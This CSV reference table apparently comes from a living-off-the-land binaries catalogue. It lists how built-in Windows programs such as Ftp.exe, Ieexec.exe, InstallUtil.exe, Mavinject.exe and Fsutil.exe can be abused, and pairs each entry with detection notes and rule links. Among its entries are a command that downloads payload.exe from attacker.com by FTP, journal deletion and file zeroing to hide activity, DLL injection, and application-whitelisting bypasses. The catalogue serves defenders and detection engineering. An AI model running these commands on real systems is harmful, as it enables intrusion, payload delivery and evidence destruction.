"Name","Description","Author","Created","Commands","Commands_Command","Commands_Description","Commands_Usecase","Commands_Category","Commands_Privileges","Commands_MitreID","Commands_OperatingSystem","Commands_Tags","Commands_Tags_Download","Full_Path","Full_Path_Path","Detection","Detection_IOC","Acknowledgement","Acknowledgement_Person","Acknowledgement_Handle","Commands_Tags_Execute","Resources","Resources_Link","Code_Sample","Code_Sample_Code","Detection_Sigma","Detection_Analysis","Detection_BlockRule","Commands_Tags_Requires","Commands_Tags_Input","Detection_Splunk","Detection_Elastic","Aliases","Aliases_Alias","Commands_Tags_Application","Commands_Tags_Type","is_legit"
"Microsoft.Workflow.Compiler.exe","A utility included with .NET that is capable of compiling and executing C# or VB.net code.","Conor Richard","2018-10-22","","[''Microsoft.Workflow.Compiler.exe {PATH} {PATH:.log}''-|-''Microsoft.Workflow.Compiler.exe {PATH} {PATH:.log}''-|-''Microsoft.Workflow.Compiler.exe {PATH} {PATH:.log}'']","[''Compile and execute C# or VB.net code in a XOML file referenced in the first argument (any extension accepted).''-|-''Compile and execute C# or VB.net code in a XOML file referenced in the test.txt file.''-|-''Compile and execute C# or VB.net code in a XOML file referenced in the test.txt file.'']","[''Compile and run code''-|-''Compile and run code''-|-''Compile and run code'']","[''Execute''-|-''Execute''-|-''AWL Bypass'']","[''User''-|-''User''-|-''User'']","[''T1127''-|-''T1127''-|-''T1127'']","[''Windows 10S, Windows 11''-|-''Windows 10S, Windows 11''-|-''Windows 10S, Windows 11'']","","","","C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe","","[''Microsoft.Workflow.Compiler.exe would not normally be run on workstations.''-|-''The presence of csc.exe or vbc.exe as child processes of Microsoft.Workflow.Compiler.exe''-|-''Presence of ""<CompilerInput"" in a text file.'']","","[''Matt Graeber''-|-''John Bergbom''-|-''FortyNorth Security''-|-''Bank Security'']","[''@mattifestation''-|-''@BergbomJohn''-|-''@FortyNorthSec''-|-''@Bank_Security'']","[''VB.Net''-|-''Csharp''-|-''XOML''-|-''XOML'']","","[''https://twitter.com/mattifestation/status/1030445200475185154''-|-''https://posts.specterops.io/arbitrary-unsigned-code-execution-vector-in-microsoft-workflow-compiler-exe-3d9294bc5efb''-|-''https://gist.github.com/mattifestation/3e28d391adbd7fe3e0c722a107a25aba#file-workflowcompilerdetectiontests-ps1''-|-''https://gist.github.com/mattifestation/7ba8fc8f724600a9f525714c9cf767fd#file-createcompilerinputxml-ps1''-|-''https://www.forcepoint.com/blog/security-labs/using-c-post-powershell-attacks''-|-''https://www.fortynorthsecurity.com/microsoft-workflow-compiler-exe-veil-and-cobalt-strike/''-|-''https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15'']","","","https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_lolbin_workflow_compiler.yml","","https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules","","","[''https://github.com/splunk/security_content/blob/961a81d4a5cb5c5febec4894d6d812497171a85c/detections/endpoint/suspicious_microsoft_workflow_compiler_usage.yml''-|-''https://github.com/splunk/security_content/blob/18f63553a9dc1a34122fa123deae2b2f9b9ea391/detections/endpoint/suspicious_microsoft_workflow_compiler_rename.yml'']","[''https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_unusual_process_network_connection.toml''-|-''https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_network_connection_from_windows_binary.toml'']","","","","","false"
"Mavinject.exe","Used by App-v in Windows","Oddvar Moe","2018-05-25","","[''MavInject.exe 3110 /INJECTRUNNING {PATH_ABSOLUTE:.dll}''-|-''Mavinject.exe 4172 /INJECTRUNNING {PATH_ABSOLUTE}:file.dll'']","[''Inject evil.dll into a process with PID 3110.''-|-''Inject file.dll stored as an Alternate Data Stream (ADS) into a process with PID 4172'']","[''Inject dll file into running process''-|-''Inject dll file into running process'']","[''Execute''-|-''ADS'']","[''User''-|-''User'']","[''T1218.013''-|-''T1564.004'']","[''Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11''-|-''Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11'']","","","","[''C:\Windows\System32\mavinject.exe''-|-''C:\Windows\SysWOW64\mavinject.exe'']","","mavinject.exe should not run unless APP-v is in use on the workstation","","[''Giuseppe N3mes1s''-|-''Oddvar Moe'']","[''@gN3mes1s''-|-''@oddvarmoe'']","[''DLL''-|-''DLL'']","","[''https://twitter.com/gN3mes1s/status/941315826107510784''-|-''https://twitter.com/Hexcorn/status/776122138063409152''-|-''https://oddvar.moe/2018/01/14/putting-data-in-alternate-data-streams-and-how-to-execute-it/'']","","","https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_lolbin_mavinject_process_injection.yml","","","","","","","","","","","false"
"Makecab.exe","Binary to package existing files into a cabinet (.cab) file","Oddvar Moe","2018-05-25","","[''makecab {PATH_ABSOLUTE:.exe} {PATH_ABSOLUTE}:autoruns.cab''-|-''makecab {PATH_SMB:.exe} {PATH_ABSOLUTE}:file.cab''-|-''makecab {PATH_SMB:.exe} {PATH_ABSOLUTE:.cab}''-|-''makecab /F {PATH:.ddf}'']","[''Compresses the target file into a CAB file stored in the Alternate Data Stream (ADS) of the target file.''-|-''Compresses the target file into a CAB file stored in the Alternate Data Stream (ADS) of the target file.''-|-''Download and compresses the target file and stores it in the target file.''-|-''Execute makecab commands as defined in the specified Diamond Definition File (.ddf); see resources for the format specification.'']","[''Hide data compressed into an alternate data stream''-|-''Hide data compressed into an alternate data stream''-|-''Download file and compress into a cab file''-|-''Bypass command-line based detections'']","[''ADS''-|-''ADS''-|-''Download''-|-''Execute'']","[''User''-|-''User''-|-''User''-|-''User'']","[''T1564.004''-|-''T1564.004''-|-''T1105''-|-''T1036'']","[''Windows XP, Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11''-|-''Windows XP, Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11''-|-''Windows XP, Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11''-|-''Windows XP, Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11'']","","","","[''C:\Windows\System32\makecab.exe''-|-''C:\Windows\SysWOW64\makecab.exe'']","","[''Makecab retrieving files from Internet''-|-''Makecab storing data into alternate data streams'']","","Oddvar Moe","@oddvarmoe","","","[''https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f''-|-''https://ss64.com/nt/makecab-directives.html''-|-''https://www.pearsonhighered.com/assets/samplechapter/0/7/8/9/0789728583.pdf''-|-''https://learn.microsoft.com/en-us/previous-versions/bb417343(v=msdn.10)#makecab-application'']","","","https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_susp_alternate_data_streams.yml","","","","","","https://github.com/elastic/detection-rules/blob/12577f7380f324fcee06dab3218582f4a11833e7/rules/windows/defense_evasion_misc_lolbin_connecting_to_the_internet.toml","","","","[''Compression''-|-''Compression''-|-''Compression''-|-''Compression'']","false"
"Ldifde.exe","Creates, modifies, and deletes LDAP directory objects.","Grzegorz Tworek","2022-08-31","","Ldifde -i -f {PATH:.ldf}","Import specified .ldf file into LDAP. If the file contains http-based attrval-spec such as thumbnailPhoto:< http://example.org/somefile.txt, the file will be downloaded into IE temp folder.","Download file from Internet","Download","Administrator","T1105","Windows Server with AD Domain Services role,  Windows 10 with AD LDS role.","","","","[''c:\windows\system32\ldifde.exe''-|-''c:\windows\syswow64\ldifde.exe'']","","","","Grzegorz Tworek","@0gtweet","","","https://twitter.com/0gtweet/status/1564968845726580736","","","[''https://github.com/SigmaHQ/sigma/blob/3d172914f6c2bd5c2b5ed471bf0657a662d395af/rules/windows/process_creation/proc_creation_win_ldifde_export.yml''-|-''https://github.com/SigmaHQ/sigma/blob/3d172914f6c2bd5c2b5ed471bf0657a662d395af/rules/windows/process_creation/proc_creation_win_ldifde_file_load.yml''-|-''https://github.com/SigmaHQ/sigma/blob/3d172914f6c2bd5c2b5ed471bf0657a662d395af/rules-emerging-threats/2019/TA/APT31/proc_creation_win_apt_apt31_judgement_panda.yml'']","","","","","","","","","","","false"
"Jsc.exe","Binary file used by .NET to compile JavaScript code to .exe or .dll format","Oddvar Moe","2019-05-31","","[''jsc.exe {PATH:.js}''-|-''jsc.exe /t:library {PATH:.js}'']","[''Use jsc.exe to compile JavaScript code stored in the provided .JS file and generate a .EXE file with the same name.''-|-''Use jsc.exe to compile JavaScript code stored in the .JS file and generate a DLL file with the same name.'']","[''Compile attacker code on system. Bypass defensive counter measures.''-|-''Compile attacker code on system. Bypass defensive counter measures.'']","[''Compile''-|-''Compile'']","[''User''-|-''User'']","[''T1127''-|-''T1127'']","[''Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11''-|-''Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11'']","","","","[''C:\Windows\Microsoft.NET\Framework\v4.0.30319\Jsc.exe''-|-''C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Jsc.exe''-|-''C:\Windows\Microsoft.NET\Framework\v2.0.50727\Jsc.exe''-|-''C:\Windows\Microsoft.NET\Framework64\v2.0.50727\Jsc.exe'']","","Jsc.exe should normally not run a system unless it is used for development.","","Malwrologist","@DissectMalware","[''JScript''-|-''JScript'']","","[''https://twitter.com/DissectMalware/status/998797808907046913''-|-''https://www.phpied.com/make-your-javascript-a-windows-exe/'']","","","https://github.com/SigmaHQ/sigma/blob/35a7244c62820fbc5a832e50b1e224ac3a1935da/rules/windows/process_creation/proc_creation_win_lolbin_jsc.yml","","","","","","","","","","","false"
"Installutil.exe","The Installer tool is a command-line utility that allows you to install and uninstall server resources by executing the installer components in specified assemblies","Oddvar Moe","2018-05-25","","[''InstallUtil.exe /logfile= /LogToConsole=false /U {PATH:.dll}''-|-''InstallUtil.exe /logfile= /LogToConsole=false /U {PATH:.dll}''-|-''InstallUtil.exe {REMOTEURL}'']","[''Execute the target .NET DLL or EXE.''-|-''Execute the target .NET DLL or EXE.''-|-''It will download a remote payload and place it in INetCache.'']","[''Use to execute code and bypass application whitelisting''-|-''Use to execute code and bypass application whitelisting''-|-''Downloads payload from remote server'']","[''AWL Bypass''-|-''Execute''-|-''Download'']","[''User''-|-''User''-|-''User'']","[''T1218.004''-|-''T1218.004''-|-''T1105'']","[''Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11''-|-''Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11''-|-''Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11'']","","INetCache","","[''C:\Windows\Microsoft.NET\Framework\v2.0.50727\InstallUtil.exe''-|-''C:\Windows\Microsoft.NET\Framework64\v2.0.50727\InstallUtil.exe''-|-''C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe''-|-''C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe'']","","","","[''Casey Smith''-|-''Nir Chako (Pentera)'']","[''@subtee''-|-''@C_h4ck_0'']","[''DLL (.NET)''-|-''EXE (.NET)''-|-''DLL (.NET)''-|-''EXE (.NET)'']","","[''https://pentestlab.blog/2017/05/08/applocker-bypass-installutil/''-|-''https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_12''-|-''https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.004/T1218.004.md''-|-''https://www.blackhillsinfosec.com/powershell-without-powershell-how-to-bypass-application-whitelisting-environment-restrictions-av/''-|-''https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/''-|-''https://docs.microsoft.com/en-us/dotnet/framework/tools/installutil-exe-installer-tool'']","","","[''https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_instalutil_no_log_execution.yml''-|-''https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_lolbin_installutil_download.yml'']","","","","","","[''https://github.com/elastic/detection-rules/blob/cc241c0b5ec590d76cb88ec638d3cc37f68b5d50/rules/windows/defense_evasion_installutil_beacon.toml''-|-''https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_network_connection_from_windows_binary.toml'']","","","","","false"
"Infdefaultinstall.exe","Binary used to perform installation based on content inside inf files","Oddvar Moe","2018-05-25","","InfDefaultInstall.exe {PATH:.inf}","Executes SCT script using scrobj.dll from a command in entered into a specially prepared INF file.","Code execution","Execute","Admin","T1218","Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11","","","","[''C:\Windows\System32\Infdefaultinstall.exe''-|-''C:\Windows\SysWOW64\Infdefaultinstall.exe'']","","","","Kyle Hanslovan","@kylehanslovan","INF","","[''https://twitter.com/KyleHanslovan/status/911997635455852544''-|-''https://blog.conscioushacker.io/index.php/2017/10/25/evading-microsofts-autoruns/''-|-''https://bohops.com/2018/03/10/leveraging-inf-sct-fetch-execute-techniques-for-bypass-evasion-persistence-part-2/'']","","https://gist.github.com/KyleHanslovan/5e0f00d331984c1fb5be32c40f3b265a","https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_infdefaultinstall_execute_sct_scripts.yml","","https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules","","","","","","","","","false"
"Ilasm.exe","used for compile c# code into dll or exe.","Hai vaknin (lux)","2020-03-17","","[''ilasm.exe {PATH_ABSOLUTE:.txt} /exe''-|-''ilasm.exe {PATH_ABSOLUTE:.txt} /dll'']","[''Binary file used by .NET to compile C#/intermediate (IL) code to .exe''-|-''Binary file used by .NET to compile C#/intermediate (IL) code to dll'']","[''Compile attacker code on system. Bypass defensive counter measures.''-|-''A description of the usecase'']","[''Compile''-|-''Compile'']","[''User''-|-''User'']","[''T1127''-|-''T1127'']","[''Windows 7, Windows 10, Windows 11''-|-''Windows 7, Windows 10, Windows 11'']","","","","[''C:\Windows\Microsoft.NET\Framework\v4.0.30319\ilasm.exe''-|-''C:\Windows\Microsoft.NET\Framework64\v4.0.30319\ilasm.exe'']","","Ilasm may not be used often in production environments (such as on endpoints)","","[''Hai Vaknin(Lux)''-|-''Lior Adar'']","@VakninHai","","","https://github.com/LuxNoBulIshit/BeforeCompileBy-ilasm/blob/master/hello_world.txt","","","https://github.com/SigmaHQ/sigma/blob/bea6f18d350d9c9fdc067f93dde0e9b11cc22dc2/rules/windows/process_creation/proc_creation_win_lolbin_ilasm.yml","","","","","","","","","","","false"
"Ieexec.exe","The IEExec.exe application is an undocumented Microsoft .NET Framework application that is included with the .NET Framework. You can use the IEExec.exe application as a host to run other managed applications that you start by using a URL.","Oddvar Moe","2018-05-25","","[''ieexec.exe {REMOTEURL:.exe}''-|-''ieexec.exe {REMOTEURL:.exe}'']","[''Downloads and executes executable from the remote server.''-|-''Downloads and executes executable from the remote server.'']","[''Download and run attacker code from remote location''-|-''Download and run attacker code from remote location'']","[''Download''-|-''Execute'']","[''User''-|-''User'']","[''T1105''-|-''T1218'']","[''Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10''-|-''Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10'']","","","","[''C:\Windows\Microsoft.NET\Framework\v2.0.50727\ieexec.exe''-|-''C:\Windows\Microsoft.NET\Framework64\v2.0.50727\ieexec.exe'']","","Network connections originating from ieexec.exe may be suspicious","","Casey Smith","@subtee","[''Remote''-|-''EXE (.NET)''-|-''Remote''-|-''EXE (.NET)'']","","https://room362.com/post/2014/2014-01-16-application-whitelist-bypass-using-ieexec-dot-exe/","","","https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_lolbin_ieexec_download.yml","","","","","","[''https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_unusual_process_network_connection.toml''-|-''https://github.com/elastic/detection-rules/blob/12577f7380f324fcee06dab3218582f4a11833e7/rules/windows/defense_evasion_misc_lolbin_connecting_to_the_internet.toml''-|-''https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_network_connection_from_windows_binary.toml'']","","","","","false"
"iediagcmd.exe","Diagnostics Utility for Internet Explorer","manasmbellani","2022-03-29","","set windir=c:\test& cd ""C:\Program Files\Internet Explorer\"" & iediagcmd.exe /out:{PATH_ABSOLUTE:.cab}","Executes binary that is pre-planted at C:\test\system32\netsh.exe.","Spawn a pre-planted executable from iediagcmd.exe.","Execute","User","T1218","Windows 10 1803, Windows 10 1703, Windows 10 22H1, Windows 10 22H2, Windows 11","","","","C:\Program Files\Internet Explorer\iediagcmd.exe","","[''Sysmon Event ID 1''-|-''Execution of process iediagcmd.exe with /out could be suspicious'']","","Adam","@hexacorn","EXE","","https://twitter.com/Hexacorn/status/1507516393859731456","","","https://github.com/manasmbellani/mycode_public/blob/master/sigma/rules/win_proc_creation_lolbin_iediagcmd.yml","","","","","","","","","","","false"
"Ie4uinit.exe","Executes commands from a specially prepared ie4uinit.inf file.","Oddvar Moe","2018-05-25","","ie4uinit.exe -BaseSettings","Executes commands from a specially prepared ie4uinit.inf file.","Get code execution by copy files to another location","Execute","User","T1218","Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11","","","","[''c:\windows\system32\ie4uinit.exe''-|-''c:\windows\sysWOW64\ie4uinit.exe''-|-''c:\windows\system32\ieuinit.inf''-|-''c:\windows\sysWOW64\ieuinit.inf'']","","[''ie4uinit.exe copied outside of %windir%''-|-''ie4uinit.exe loading an inf file (ieuinit.inf) from outside %windir%'']","","Jimmy","@bohops","INF","","https://bohops.com/2018/03/10/leveraging-inf-sct-fetch-execute-techniques-for-bypass-evasion-persistence-part-2/","","","https://github.com/SigmaHQ/sigma/blob/bea6f18d350d9c9fdc067f93dde0e9b11cc22dc2/rules/windows/process_creation/proc_creation_win_lolbin_ie4uinit.yml","","","","","","","","","","","false"
"IMEWDBLD.exe","Microsoft IME Open Extended Dictionary Module","Wade Hickey","2020-03-05","","C:\Windows\System32\IME\SHARED\IMEWDBLD.exe {REMOTEURL}","IMEWDBLD.exe attempts to load a dictionary file, if provided a URL as an argument, it will download the file served at by that URL and save it to INetCache.","Download file from Internet","Download","User","T1105","Windows 10, Windows 11","","INetCache","","C:\Windows\System32\IME\SHARED\IMEWDBLD.exe","","","","Wade Hickey","@notwhickey","","","https://twitter.com/notwhickey/status/1367493406835040265","","","https://github.com/SigmaHQ/sigma/blob/bea6f18d350d9c9fdc067f93dde0e9b11cc22dc2/rules/windows/network_connection/net_connection_win_imewdbld.yml","","","","","","","","","","","false"
"Hh.exe","Binary used for processing chm files in Windows","Oddvar Moe","2018-05-25","","[''HH.exe {REMOTEURL:.bat}''-|-''HH.exe {PATH_ABSOLUTE:.exe}''-|-''HH.exe {REMOTEURL:.chm}'']","[''Open the target batch script with HTML Help.''-|-''Executes specified executable with HTML Help.''-|-''Executes a remote .chm file which can contain commands.'']","[''Download files from url''-|-''Execute process with HH.exe''-|-''Execute commands with HH.exe'']","[''Download''-|-''Execute''-|-''Execute'']","[''User''-|-''User''-|-''User'']","[''T1105''-|-''T1218.001''-|-''T1218.001'']","[''Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11''-|-''Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11''-|-''Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11'']","","","","[''C:\Windows\hh.exe''-|-''C:\Windows\SysWOW64\hh.exe'']","","","","Oddvar Moe","@oddvarmoe","[''EXE''-|-''EXE''-|-''CMD''-|-''CHM''-|-''Remote'']","","https://oddvar.moe/2017/08/13/bypassing-device-guard-umci-using-chm-cve-2017-8625/","","","[''https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_hh_chm_execution.yml''-|-''https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_hh_html_help_susp_child_process.yml'']","","","","","[''https://github.com/splunk/security_content/blob/bee2a4cefa533f286c546cbe6798a0b5dec3e5ef/detections/endpoint/detect_html_help_spawn_child_process.yml''-|-''https://github.com/splunk/security_content/blob/bee2a4cefa533f286c546cbe6798a0b5dec3e5ef/detections/endpoint/detect_html_help_url_in_command_line.yml'']","[''https://github.com/elastic/detection-rules/blob/ef7548f04c4341e0d1a172810330d59453f46a21/rules/windows/execution_via_compiled_html_file.toml''-|-''https://github.com/elastic/detection-rules/blob/61afb1c1c0c3f50637b1bb194f3e6fb09f476e50/rules/windows/execution_html_help_executable_program_connecting_to_the_internet.toml'']","","","[''GUI''-|-''GUI'']","","false"
"Gpscript.exe","Used by group policy to process scripts","Oddvar Moe","2018-05-25","","[''Gpscript /logon''-|-''Gpscript /startup'']","[''Executes logon scripts configured in Group Policy.''-|-''Executes startup scripts configured in Group Policy'']","[''Add local group policy logon script to execute file and hide from defensive counter measures''-|-''Add local group policy logon script to execute file and hide from defensive counter measures'']","[''Execute''-|-''Execute'']","[''Administrator''-|-''Administrator'']","[''T1218''-|-''T1218'']","[''Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11''-|-''Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11'']","","","","[''C:\Windows\System32\gpscript.exe''-|-''C:\Windows\SysWOW64\gpscript.exe'']","","[''Scripts added in local group policy''-|-''Execution of Gpscript.exe after logon'']","","Oddvar Moe","@oddvarmoe","[''CMD''-|-''CMD'']","","https://oddvar.moe/2018/04/27/gpscript-exe-another-lolbin-to-the-list/","","","https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_lolbin_gpscript.yml","","","","","","","","","","","false"
"Ftp.exe","A binary designed for connecting to FTP servers","Oddvar Moe","2018-12-10","","[''echo !{CMD} > ftpcommands.txt && ftp -s:ftpcommands.txt''-|-''cmd.exe /c ""@echo open attacker.com 21>ftp.txt&@echo USER attacker>>ftp.txt&@echo PASS PaSsWoRd>>ftp.txt&@echo binary>>ftp.txt&@echo GET /payload.exe>>ftp.txt&@echo quit>>ftp.txt&@ftp -s:ftp.txt -v""'']","[''Executes the commands you put inside the text file.''-|-''Download'']","[''Spawn new process using ftp.exe. Ftp.exe runs cmd /C YourCommand''-|-''Spawn new process using ftp.exe. Ftp.exe downloads the binary.'']","[''Execute''-|-''Download'']","[''User''-|-''User'']","[''T1202''-|-''T1105'']","[''Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11''-|-''Windows XP, Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11'']","","","","[''C:\Windows\System32\ftp.exe''-|-''C:\Windows\SysWOW64\ftp.exe'']","","cmd /c as child process of ftp.exe","","[''Casey Smith''-|-''BennyHusted''-|-''Amit Serper'']","[''@subtee''-|-''''-|-''@0xAmit'']","CMD","","[''https://twitter.com/0xAmit/status/1070063130636640256''-|-''https://medium.com/@0xamit/lets-talk-about-security-research-discoveries-and-proper-discussion-etiquette-on-twitter-10f9be6d1939''-|-''https://ss64.com/nt/ftp.html''-|-''https://www.asafety.fr/vuln-exploit-poc/windows-dos-powershell-upload-de-fichier-en-ligne-de-commande-one-liner/'']","","","https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_lolbin_ftp.yml","","","","","","","","","","","false"
"Fsutil.exe","File System Utility","Elliot Killick","2021-08-16","","[''fsutil.exe file setZeroData offset=0 length=9999999999 {PATH_ABSOLUTE}''-|-''fsutil.exe usn deletejournal /d c:''-|-''fsutil.exe trace decode'']","[''Zero out a file''-|-''Delete the USN journal volume to hide file creation activity''-|-''Executes a pre-planted binary named netsh.exe from the current directory.'']","[''Can be used to forensically erase a file''-|-''Can be used to hide file creation activity''-|-''Spawn a pre-planted executable from fsutil.exe.'']","[''Tamper''-|-''Tamper''-|-''Execute'']","[''User''-|-''User''-|-''User'']","[''T1485''-|-''T1485''-|-''T1218'']","[''Windows XP, Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10''-|-''Windows XP, Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10''-|-''Windows 11'']","","","","[''C:\Windows\System32\fsutil.exe''-|-''C:\Windows\SysWOW64\fsutil.exe'']","","[''fsutil.exe should not be run on a normal workstation''-|-''file setZeroData (not case-sensitive) in the process arguments''-|-''Sysmon Event ID 1''-|-''Execution of process fsutil.exe with trace decode could be suspicious''-|-''Non-Windows netsh.exe execution'']","","[''Elliot Killick''-|-''Jimmy''-|-''Grzegorz Tworek'']","[''@elliotkillick''-|-''@bohops''-|-''@0gtweet'']","EXE","","https://twitter.com/0gtweet/status/1720724516324704404","","","https://github.com/SigmaHQ/sigma/blob/ff5102832031425f6eed011dd3a2e62653008c94/rules/windows/process_creation/proc_creation_win_susp_fsutil_usage.yml","","","","","","","","","","","false"
"Forfiles.exe","Selects and executes a command on a file or set of files. This command is useful for batch processing.","Oddvar Moe","2018-05-25","","[''forfiles /p c:\windows\system32 /m notepad.exe /c ""{CMD}""''-|-''forfiles /p c:\windows\system32 /m notepad.exe /c ""{PATH_ABSOLUTE}:evil.exe""'']","[''Executes specified command since there is a match for notepad.exe in the c:\windows\System32 folder.''-|-''Executes the evil.exe Alternate Data Stream (AD) since there is a match for notepad.exe in the c:\windows\system32 folder.'']","[''Use forfiles to start a new process to evade defensive counter measures''-|-''Use forfiles to start a new process from a binary hidden in an alternate data stream'']","[''Execute''-|-''ADS'']","[''User''-|-''User'']","[''T1202''-|-''T1564.004'']","[''Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11''-|-''Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11'']","","","","[''C:\Windows\System32\forfiles.exe''-|-''C:\Windows\SysWOW64\forfiles.exe'']","","","","[''Eric''-|-''Oddvar Moe'']","[''@vector_sec''-|-''@oddvarmoe'']","[''EXE''-|-''EXE'']","","[''https://twitter.com/vector_sec/status/896049052642533376''-|-''https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f''-|-''https://oddvar.moe/2018/01/14/putting-data-in-alternate-data-streams-and-how-to-execute-it/'']","","","https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_lolbin_forfiles.yml","","","","","","","","","","","false"
